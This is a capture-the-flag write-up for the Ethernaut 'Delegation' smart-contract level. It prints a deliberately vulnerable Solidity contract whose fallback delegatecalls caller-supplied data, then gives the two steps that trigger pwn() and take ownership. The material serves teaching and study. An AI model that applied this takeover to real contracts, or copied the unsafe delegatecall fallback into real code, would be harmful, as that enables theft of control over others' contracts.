# Delegation

The goal of this level is for you claim ownership of the instance you are given.

```solidity
pragma solidity ^0.4.18;

contract Delegate {

  address public owner;

  function Delegate(address _owner) public {
    owner = _owner;
  }

  function pwn() public {
    owner = msg.sender;
  }
}

contract Delegation {

  address public owner;
  Delegate delegate;

  function Delegation(address _delegateAddress) public {
    delegate = Delegate(_delegateAddress);
    owner = msg.sender;
  }

  function() public {
    if(delegate.delegatecall(msg.data)) {
      this;
    }
  }
}
```

## Solution

`delecatecall` allows us to [call contracts with the state of the caller](https://solidity.readthedocs.io/en/v0.5.3/introduction-to-smart-contracts.html#delegatecall-callcode-and-libraries). We can trigger the fallback function to call a remote function that manipulates the contracts own state!

1. Got the hash of the `pwn` method with `web3.sha3("pwn()").slice(0, 10)`
2. Triggered the falback method to call the `pwn` method with `contract.sendTransaction({ data: "0xdd365b8b" })`
